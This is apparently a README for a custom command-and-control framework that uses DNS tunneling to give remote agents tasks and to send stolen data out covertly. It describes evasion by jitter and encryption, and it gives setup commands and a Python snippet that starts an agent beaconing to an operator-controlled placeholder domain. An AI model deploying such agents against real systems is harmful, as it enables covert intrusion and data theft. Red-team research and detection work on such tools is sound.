# Phantom C2 Framework

A lightweight, custom command and control (C2) framework designed for security research and understanding advanced adversary tradecraft. Implements DNS tunneling as a covert channel to bypass traditional network monitoring.

**Disclaimer: This project is for educational and authorized security research only.**

## Features

- **Covert DNS Tunneling**: Agents communicate via encrypted DNS queries and TXT records
- **AES-256 Encryption**: All C2 communications are securely encrypted
- **Configurable Jitter**: Randomizes beacon timing to evade detection
- **Cross-Platform Agents**: Python-based agents for Windows, Linux, and macOS
- **Modular Design**: Easy to extend with new transport methods

## Architecture

[Phantom Agent] <--DNS Tunnel--> [C2 Server] <--Web Interface--> [Operator]
│ │
├── Beaconing ├── Agent Management
├── Task Execution ├── Task Queue
└── Result Exfiltration └── Data Collection


### Protocol Overview
1. **Beaconing**: Agents periodically send DNS queries to subdomains of a controlled domain
2. **Tasking**: Commands are encoded in DNS TXT records
3. **Execution**: Agents parse and execute received commands
4. **Exfiltration**: Results are chunked and sent back via subsequent DNS queries

## Quick Start

### Prerequisites
- Python 3.8+
- A domain name with DNS control
- `dnspython` library

### Installation
```bash
git clone https://github.com/yourusername/phantom-c2-framework
cd phantom-c2-framework
pip install -r server/requirements.txt
```

### Server Setup
```bash
cd server
python c2_server.py --domain your-controlled-domain.com
```

### Agent Deployment
```bash
from agent.phantom_agent import PhantomAgent
agent = PhantomAgent(server_domain="your-controlled-domain.com")
agent.start()
```
